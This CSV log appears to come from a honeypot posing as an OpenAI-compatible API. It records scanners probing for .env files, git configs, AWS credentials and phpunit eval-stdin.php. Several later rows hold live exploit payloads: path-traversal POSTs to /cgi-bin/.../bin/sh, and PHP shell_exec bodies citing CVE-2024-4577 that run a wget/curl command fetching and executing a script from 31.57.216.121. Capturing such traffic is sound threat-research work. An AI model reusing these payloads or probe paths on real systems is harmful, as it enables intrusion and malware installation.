request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
25d56970-288e-44ee-bf21-e6dc3b9685e4,2026-03-30T05:12:28.907598+00:00,anon_4f938521,GET,/static../.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
41638438-43ae-4b0a-a48e-839b8201e779,2026-03-30T05:12:30.452714+00:00,anon_4f938521,GET,/config/.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d8b06f50-deca-4931-a673-81e5dd615e4d,2026-03-30T05:12:33.526748+00:00,anon_4f938521,GET,/.env.qa,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
56212c86-6fe6-427c-a3cb-fa8055898d8e,2026-03-30T05:12:34.832169+00:00,anon_4f938521,GET,/api/.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
6b2f4289-26d5-4c4f-9b6b-084bf7b70188,2026-03-30T05:12:36.327449+00:00,anon_4f938521,GET,/.aws/credentials,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
94b87702-af09-4a65-b1b1-7deaf9bbf634,2026-03-30T05:12:38.486433+00:00,anon_4f938521,GET,/.env.dev,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
07b83dbb-521a-461c-b878-c03b9a6c4a0b,2026-03-30T05:12:39.266295+00:00,anon_4f938521,GET,/.env.local,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4f080de0-18a2-4089-a853-93e553b20625,2026-03-30T05:12:41.277807+00:00,anon_4f938521,GET,/configuration/.env,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
388244b2-c335-49e0-a2c3-d7ccb4e7ff59,2026-03-30T05:12:43.105447+00:00,anon_4f938521,GET,/.env.development.local,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e3007168-4899-40b2-86ca-80dc712dad86,2026-03-30T05:12:44.448312+00:00,anon_4f938521,GET,/.env.preprod,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
027ef2e7-05f2-40d4-bb15-b6d28390c2d3,2026-03-30T05:12:45.878017+00:00,anon_4f938521,GET,/src/.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7c4e639c-a0cb-4252-ac01-d6759c6e3e0c,2026-03-30T05:12:47.184314+00:00,anon_4f938521,GET,/.env.config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1c56b8a0-f602-443f-88d6-a687e4f90588,2026-03-30T05:12:49.017889+00:00,anon_4f938521,GET,/.env.uat,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e3ba0ab4-3ad4-4549-b397-accf720d1faa,2026-03-30T05:12:50.231616+00:00,anon_4f938521,GET,/backup/.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
b8450321-f6f1-40ac-9b50-ae0e7bd86c41,2026-03-30T05:12:52.874651+00:00,anon_4f938521,GET,/cms/.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9658a4b8-56ae-4d36-b782-2bc5adecc924,2026-03-30T05:12:54.042872+00:00,anon_4f938521,GET,/api/.env,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
8e1556b0-3565-44a3-a0b0-ce0e7186fa8d,2026-03-30T05:12:56.184423+00:00,anon_4f938521,GET,/.env,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
bef01bc0-5c08-47d6-a528-60c683a32584,2026-03-30T05:12:57.775909+00:00,anon_4f938521,GET,/.env.ci,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1fe5a1a7-ce80-4ea9-97cb-67e50cc2c93d,2026-03-30T05:12:59.460558+00:00,anon_4f938521,GET,/.env.prod,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
92379eeb-de81-4a67-ae46-97a63a7eae2f,2026-03-30T05:13:00.691468+00:00,anon_4f938521,GET,/.env.template,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
96e780b4-5904-4c4c-9dbe-1eb20322533d,2026-03-30T05:13:03.581810+00:00,anon_4f938521,GET,/settings/.env,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
fab3e1c3-b489-4a36-803f-e82fc5734e77,2026-03-30T05:13:04.452405+00:00,anon_4f938521,GET,/media../.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c3e00582-1370-4c88-9476-110b1defb15f,2026-03-30T05:13:05.990492+00:00,anon_4f938521,GET,/public/.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
87e90da5-f096-4733-a096-4f700d462c49,2026-03-30T05:13:07.307794+00:00,anon_4f938521,GET,/.env.prod.local,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7ff8c85c-16bf-4681-8b8f-a26d9d51cdbb,2026-03-30T05:13:08.580172+00:00,anon_4f938521,GET,/.env.production.local,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
3fa18eb6-7fcb-4abb-a804-74d4486ef19c,2026-03-30T05:13:09.929475+00:00,anon_4f938521,GET,/.env.stage,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
3a72e6c9-eccb-48cd-8e42-363431ec3a7e,2026-03-30T05:13:12.915519+00:00,anon_4f938521,GET,/project/.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
43d37301-a544-46af-a9bc-186fef788d40,2026-03-30T05:13:13.915564+00:00,anon_4f938521,GET,/.env.bak,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
ed6c0da1-7db2-4dbe-aee5-a28bea333c2a,2026-03-30T05:13:14.553696+00:00,anon_4f938521,GET,/.envrc,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
bef0e7aa-e67a-4122-b959-e46f2be2096f,2026-03-30T05:13:15.886935+00:00,anon_4f938521,GET,/.env.secret,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
6a988233-05aa-4ea4-9010-5dea53be6f51,2026-03-30T05:13:17.916039+00:00,anon_4f938521,GET,/.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
b0dd93d0-6662-491a-ba34-5db68b2dda1d,2026-03-30T05:13:19.237151+00:00,anon_4f938521,GET,/data/.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7659e571-01f9-4e04-a093-006f3a87cc9e,2026-03-30T05:13:22.057457+00:00,anon_4f938521,GET,/dev/.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
71113041-75fe-468d-afd7-41d24c6fa371,2026-03-30T05:13:23.795074+00:00,anon_4f938521,GET,/www/.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
3d1fd44b-f137-4e9e-b61c-b213ed584ec7,2026-03-30T05:13:25.358676+00:00,anon_4f938521,GET,/.env.dev.local,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
bf7af4f9-9aa7-440b-88db-99728c728334,2026-03-30T05:13:26.403080+00:00,anon_4f938521,GET,/.env.staging.local,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
5c20ae26-f32b-4544-8d25-1f626f1f2bb1,2026-03-30T05:13:27.985067+00:00,anon_4f938521,GET,/.env.testing.local,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c22b3f72-e408-40c2-8946-e79b32fe98ce,2026-03-30T05:13:29.087335+00:00,anon_4f938521,GET,/app/.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
18f5ace1-6f13-4f44-88eb-9e7829283ae6,2026-03-30T05:13:29.824356+00:00,anon_4f938521,GET,/server/.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1565afeb-ebf1-428c-975c-2453b6ba3db8,2026-03-30T05:13:30.759058+00:00,anon_4f938521,GET,/.env.sandbox,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
5ba1c62e-a2c3-4971-b481-85544d3760e4,2026-03-30T05:13:31.493407+00:00,anon_4f938521,GET,/files/.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
bcadc393-c366-4a5c-9e13-33237d5db301,2026-03-30T05:13:33.115099+00:00,anon_4f938521,GET,/admin/.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
8538cfe9-8e5e-485e-a829-5e069d2f8b4a,2026-03-30T05:13:34.459465+00:00,anon_4f938521,GET,/core/.git/config,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a356a694-9ddc-46d3-933f-a5ffe0f7a58c,2026-03-30T05:13:36.371589+00:00,anon_4f938521,GET,/config.json,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
6fa15f4f-a2b3-4477-bc45-430eea240b62,2026-03-30T05:13:37.398802+00:00,anon_4f938521,GET,/.env.backup,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
241eac09-aa6b-46a6-893a-1b199d9e6324,2026-03-30T05:13:39.579871+00:00,anon_4f938521,GET,/build/.env,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c5e4a6cf-c153-43af-a7e2-2ada03c62ba5,2026-03-30T05:13:40.415589+00:00,anon_4f938521,GET,/.env_sample,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
013d7024-125d-424d-a9a5-e5ccec718ef8,2026-03-30T05:13:41.595843+00:00,anon_4f938521,GET,/.env.testing,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
70168ef8-1b89-4d45-8896-8502ddbe68d8,2026-03-30T05:13:42.609028+00:00,anon_4f938521,GET,/config/.env,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d0f9f1c3-64e7-4a73-b7df-d02795f686e0,2026-03-30T05:27:29.363902+00:00,anon_c8836868,GET,/cgi-bin/luci/;stok=/locale,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
fa8f88e4-673e-47c3-9524-d15ea0ecbb2a,2026-03-30T05:52:48.217652+00:00,anon_156573ab,GET,/,[honeypot-host],Mozilla/5.0,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
f3c3e6fe-8f51-416b-b7d5-cc9d14c2f417,2026-03-30T06:23:18.876875+00:00,anon_f334d8af,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
703c93ac-9023-4aed-b576-9f06c670f5aa,2026-03-30T06:29:43.008552+00:00,anon_01a494f8,GET,/cgi-bin/luci/;stok=/locale,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
f58c744e-4b23-4a22-9d85-c994a63391b1,2026-03-30T06:57:36.913880+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
eeab65e7-280e-4cb4-ae00-b4fbc42f4b65,2026-03-30T07:40:06.847094+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
cbb6650f-a3d1-434f-b0fe-47adc04e5746,2026-03-30T07:43:36.903408+00:00,anon_b0e595ae,GET,/,,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",1,
befde5aa-644d-47b7-a589-8260ee971d4b,2026-03-30T08:30:47.736968+00:00,anon_0fbc7148,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,[honeypot-host],libredtail-http,,119,118,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
dad92445-400f-440a-a7c3-ffef47cb4611,2026-03-30T08:30:49.144210+00:00,anon_0fbc7148,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,[honeypot-host],libredtail-http,,119,118,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
cb3da799-01dc-41a1-823e-d89c1fa527de,2026-03-30T08:30:50.992658+00:00,anon_0fbc7148,POST,/hello.world,[honeypot-host],libredtail-http,,241,118,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
00337cd0-2e2d-4d21-9ee8-13c1b5027f58,2026-03-30T08:30:52.848098+00:00,anon_0fbc7148,POST,/,[honeypot-host],libredtail-http,,241,118,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
0f021057-853d-40be-a022-945c7c694d1e,2026-03-30T08:30:54.863318+00:00,anon_0fbc7148,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
3e48ca62-5ce1-44c8-a892-9dc6e90c53cf,2026-03-30T08:30:56.608633+00:00,anon_0fbc7148,GET,/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
f673fbcc-7c6f-4d52-bbec-f5b1f1d086c6,2026-03-30T08:30:58.400938+00:00,anon_0fbc7148,GET,/vendor/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
3ca43d37-12af-42e6-875e-4c1079a04292,2026-03-30T08:31:00.428863+00:00,anon_0fbc7148,GET,/vendor/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7a65f72e-d90f-4f50-a19a-eeeede535dde,2026-03-30T08:31:02.114882+00:00,anon_0fbc7148,GET,/vendor/phpunit/phpunit/LICENSE/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e49c5e5b-aea2-4a5b-aa1d-6fef36ad5c0d,2026-03-30T08:31:04.473677+00:00,anon_0fbc7148,GET,/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4398fbb0-2998-405d-a8c1-4b6bc318156e,2026-03-30T08:31:05.711459+00:00,anon_0fbc7148,GET,/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
72c171ea-3f1f-4abc-be44-0436bd8fb80e,2026-03-30T08:31:07.341458+00:00,anon_0fbc7148,GET,/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e295920e-ec68-4a3a-ac43-b04f604000a1,2026-03-30T08:31:09.116946+00:00,anon_0fbc7148,GET,/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e734a1a0-f024-49ad-9117-4d7cf608b1a2,2026-03-30T08:31:10.995342+00:00,anon_0fbc7148,GET,/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7d3a92e9-84ff-49df-b6b2-c1f1c7457009,2026-03-30T08:31:12.250684+00:00,anon_0fbc7148,GET,/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
673f3c3f-8330-4fb7-ab97-5e24a8b7836e,2026-03-30T08:31:13.820074+00:00,anon_0fbc7148,GET,/lib/phpunit/phpunit/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
643545f8-4982-46fd-8dc0-4c31e5bf36cb,2026-03-30T08:31:15.556698+00:00,anon_0fbc7148,GET,/lib/phpunit/src/Util/PHP/eval-stdin.php,[honeypot-host],libredtail-http,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
